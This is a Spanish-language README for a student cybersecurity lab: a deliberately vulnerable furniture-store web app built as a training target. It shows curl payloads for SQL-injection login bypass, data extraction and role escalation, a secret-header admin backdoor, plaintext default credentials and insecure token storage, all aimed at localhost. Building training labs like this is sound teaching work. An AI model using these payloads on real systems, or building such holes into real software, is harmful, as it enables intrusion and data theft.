# Honeypot Security Lab - Laboratorio de Mueblería

## ADVERTENCIA CRÍTICA DE SEGURIDAD

**ESTE ES UN PROYECTO EDUCATIVO CON VULNERABILIDADES INTENCIONALES**

-   **NO USAR EN PRODUCCIÓN**
-   **NO EXPONER A INTERNET**
-   **SOLO PARA AMBIENTES DE LABORATORIO AISLADOS**
-   Diseñado exclusivamente para educación en ciberseguridad
-   Uso en entornos Docker/VM aislados únicamente
-   Requiere autorización explícita para cualquier prueba

---

## Descripción del Proyecto

Sistema web full-stack de una mueblería ficticia diseñado como honeypot educativo para el aprendizaje de técnicas de pentesting, análisis de vulnerabilidades y respuesta a incidentes de seguridad.

### Tecnologías Implementadas

**Backend:**

-   Node.js + Express.js
-   MySQL 8.0
-   JWT para autenticación
-   Docker para aislamiento

**Frontend:**

-   React 19 + Vite
-   React Router para navegación
-   LocalStorage para gestión de sesiones

---

## Arquitectura del Sistema

```
honeypot-muebleria/
├── Backend/                 # API REST vulnerable
│   ├── src/
│   │   ├── controllers/     # Lógica de negocio
│   │   ├── routes/          # Definición de endpoints
│   │   ├── middlewares/     # Auth + Backdoor
│   │   └── database/        # Esquemas SQL
│   ├── docker-compose.yml   # MySQL + phpMyAdmin
│   └── requests/            # Tests con REST Client
│
└── front/                   # Interfaz React
    ├── src/
    │   ├── pages/           # Páginas principales
    │   ├── components/      # Componentes reutilizables
    │   ├── service/         # Llamadas API
    │   └── auth/            # Contexto de autenticación
    └── public/
```

---

## Vulnerabilidades Destacadas

### Backend

#### 1. SQL Injection (CRÍTICA)

**Endpoints afectados:**

-   `POST /api/auth/login` - Login vulnerable
-   `POST /api/contacts` - Formulario de contacto
-   `GET /api/contacts?search=` - Búsqueda vulnerable

**Ejemplo de explotación:**

```bash
# Bypass de autenticación con comentario SQL
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"cualquiera"}'

# Extracción de datos mediante UNION
curl "http://localhost:3000/api/contacts?search=1' UNION SELECT username,email,password,role FROM users--"
```

**Impacto:** Acceso total a la base de datos, bypass de autenticación, escalación de privilegios.

---

#### 2. Backdoor de Desarrollo (CRÍTICA)

**Header secreto:** `X-AccessDev: Testing-Mode`

**Ejemplo de explotación:**

```bash
# Acceso a endpoints admin sin autenticación
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"

# Obtener estadísticas sin JWT
curl http://localhost:3000/api/admin/stats \
  -H "X-AccessDev: Testing-Mode"
```

**Impacto:** Bypass completo de autenticación, acceso a funciones administrativas.

---

#### 3. Credenciales Débiles (ALTA)

Usuarios con contraseñas predecibles almacenadas en **texto plano**:

| Usuario | Contraseña | Rol   |
| ------- | ---------- | ----- |
| admin   | admin      | admin |
| root    | root123    | admin |
| user1   | user123    | user  |
| guest   | guest      | user  |

---

### Frontend

#### 1. Information Disclosure (CRÍTICA)

**Archivo:** `index.html`

Comentarios HTML revelan el header de backdoor:

```html
<!-- Header secreto para desarrollo: X-AccessDev: Testing-Mode -->
```

**Impacto:** Facilita el descubrimiento del backdoor mediante análisis del código fuente.

---

#### 2. Tokens en LocalStorage (ALTA)

**Ubicación:** `src/auth/AuthProvider.jsx`

```javascript
localStorage.setItem("authToken", token);
```

**Impacto:**

-   Vulnerable a XSS
-   Tokens no expiran automáticamente
-   Persisten después de logout

---

#### 3. Client-Side Security Controls (MEDIA)

Rutas protegidas solo con validación frontend:

```javascript
// ProtectedRoute.jsx - Fácilmente bypasseable
if (!authToken) {
    return <Navigate to="/login" />;
}
```

**Impacto:** Controles de acceso pueden ser eludidos manipulando el navegador.

---

## Guía de Inicio Rápido

### Requisitos Previos

-   Node.js 18+
-   Docker & Docker Compose
-   Git

### Instalación

#### 1. Clonar el Repositorio

```bash
git clone https://github.com/guidoserniotti/honeypot-muebleria.git
cd honeypot-muebleria
```

#### 2. Configurar Backend

```bash
cd Backend

# Instalar dependencias
npm install

# Iniciar MySQL con Docker
docker-compose up -d

# Esperar a que MySQL esté listo (5-10 segundos)
Start-Sleep -Seconds 10

# Inicializar base de datos
npm run init-db

# Iniciar servidor de desarrollo
npm run dev
```

El backend estará disponible en: `http://localhost:3000`

#### 3. Configurar Frontend (Opcional)

```bash
cd ../front

# Instalar dependencias
npm install

# Iniciar servidor de desarrollo
npm run dev
```

El frontend estará disponible en: `http://localhost:5173`

---

## Ejemplos de Explotación

### Ejemplo 1: SQL Injection Básico

```bash
# 1. Intentar login normal (fallará)
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}'

# 2. Exploit con SQL Injection
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'

# Resultado: Token JWT válido sin contraseña correcta
```

---

### Ejemplo 2: Uso del Backdoor

```bash
# 1. Intentar acceso sin header (fallará - 401)
curl http://localhost:3000/api/admin/users

# 2. Usar el header secreto
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"

# Resultado: Lista completa de usuarios sin autenticación
```

---

### Ejemplo 3: Combinación de Técnicas

```bash
# 1. Descubrir backdoor en código fuente HTML
curl http://localhost:5173 | grep "X-AccessDev"

# 2. Extraer usuarios con backdoor
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode" > users.json

# 3. Usar SQL Injection para modificar roles
curl -X POST http://localhost:3000/api/contacts \
  -H "Content-Type: application/json" \
  -d '{"name":"test'\''); UPDATE users SET role='\''admin'\'' WHERE username='\''user1'\''; --","email":"test@test.com","message":"msg"}'
```

---

## Scripts de Testing

El proyecto incluye scripts PowerShell para automatizar pruebas:

```powershell
# Backend/test-final.ps1 - Suite completa de tests
.\test-final.ps1

# Backend/test-sql-injection.ps1 - Solo SQL Injection
.\test-sql-injection.ps1

# Backend/test-backdoor.ps1 - Solo backdoor
.\test-backdoor.ps1
```

---

## Archivos de Documentación

### Backend

-   `README.md` - Documentación completa del backend
-   `EXPLOITATION_GUIDE.md` - Guía detallada de explotación
-   `CREDENTIALS.md` - Credenciales y configuración rápida
-   `MYSQL_SETUP.md` - Configuración de base de datos
-   `requests/` - Colección de tests REST Client

### Frontend

-   `README.md` - Documentación del frontend
-   `VULNERABILITIES.md` - Lista completa de vulnerabilidades
-   `QUICKSTART.md` - Guía de inicio rápido
-   `CONTACTFORM_GUIDE.md` - SQL Injection en formulario

---

## Mapeo OWASP Top 10 2021

| Vulnerabilidad           | OWASP Category                             |
| ------------------------ | ------------------------------------------ |
| SQL Injection            | A03:2021 - Injection                       |
| Backdoor Header          | A01:2021 - Broken Access Control           |
| Credenciales Débiles     | A07:2021 - Identification & Authentication |
| Passwords en Texto Plano | A02:2021 - Cryptographic Failures          |
| Information Disclosure   | A05:2021 - Security Misconfiguration       |
| Tokens en LocalStorage   | A07:2021 - Identification & Authentication |
| Client-Side Controls     | A04:2021 - Insecure Design                 |

---

## MITRE ATT&CK Mapping

| Técnica                       | ID        | Implementado                |
| ----------------------------- | --------- | --------------------------- |
| Valid Accounts                | T1078     | Credenciales débiles        |
| Exploitation of SQL Injection | T1190     | Login + Contacts vulnerable |
| Web Service                   | T1102     | API REST expuesta           |
| Credentials from Web Browsers | T1555.003 | LocalStorage tokens         |

---

## Troubleshooting

### Error: "ECONNREFUSED" al iniciar frontend

**Causa:** Backend no está corriendo.

**Solución:**

```bash
cd Backend
npm run dev
```

---

### Error: MySQL no responde

**Causa:** Contenedor Docker no está iniciado o no está listo.

**Solución:**

```bash
docker-compose down
docker-compose up -d
Start-Sleep -Seconds 10
npm run init-db
```

---

### Error: "Table doesn't exist"

**Causa:** Base de datos no inicializada.

**Solución:**

```bash
npm run init-db
```

---

## Recursos Adicionales

-   [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-   [MITRE ATT&CK Framework](https://attack.mitre.org/)
-   [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
-   [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## Datos de Entrega del Proyecto

### Información Académica

**Institución:**  
Universidad Tecnológica Nacional (FRVM)

**Asignatura:**  
Seguridad Informática

**Año Académico:**  
2025

### Autores del Proyecto

-   Nombre Completo: Guido Serniotti , Legajo: 14111 , Email: guido.serniotti.13@gmail.com , GitHub: github.com/guidoserniotti

-   Nombre Completo: Álvaro Ibarra , Legajo: 14363 , Email: ibarraalvaro852@gmail.com , GitHub: github.com/Ibarra1812

-   Nombre Completo: Tomás Zegatti , Legajo: 13433 , Email: tomaszegatti1@gmail.com , GitHub: github.com/TomasZega

---

### Docente/Tutor

**Nombre:**  
_Ing. Fernando Boiero_

---

### Estadísticas del Proyecto

| Métrica                     | Valor       |
| --------------------------- | ----------- |
| Líneas de Código (Backend)  | ~3,000+ LOC |
| Líneas de Código (Frontend) | ~2,500+ LOC |
| Endpoints API               | 15+         |
| Vulnerabilidades Únicas     | 8+          |
| Archivos de Documentación   | 15+         |
| Scripts de Testing          | 10+         |

## Descargo de Responsabilidad Legal

Este software contiene vulnerabilidades de seguridad **INTENCIONALES** con fines exclusivamente educativos.

**Los autores NO se hacen responsables por:**

-   Uso indebido del código
-   Implementación en entornos de producción
-   Ataques realizados sin autorización
-   Daños causados por mal uso del proyecto

**ADVERTENCIA LEGAL:**
El uso de técnicas de hacking en sistemas sin autorización explícita es **ILEGAL** y puede resultar en consecuencias legales graves. Este proyecto debe usarse únicamente en entornos controlados con permiso explícito.

**Cumplimiento Legal:**
Este proyecto cumple con las normativas educativas y se utiliza únicamente para:

-   Aprendizaje académico
-   Investigación en seguridad informática
-   Entrenamiento en entornos aislados
